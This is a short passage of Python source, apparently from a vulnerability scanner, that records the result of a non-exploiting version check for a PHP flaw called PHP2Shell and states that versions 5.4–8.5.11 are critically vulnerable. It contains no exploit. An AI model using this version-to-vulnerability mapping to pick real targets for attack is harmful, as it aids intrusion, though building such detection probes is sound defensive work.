                               "if it is 5.4–8.5.11 it is vulnerable (critical, actively exploited). This "
                               "probe does not exploit the bug.")]
        return [AttemptRec("php2shell-version", self.objective, steps, False, 0.0, "",
                           "No PHP version banner and no PHP signal — PHP2Shell not determinable here.")]
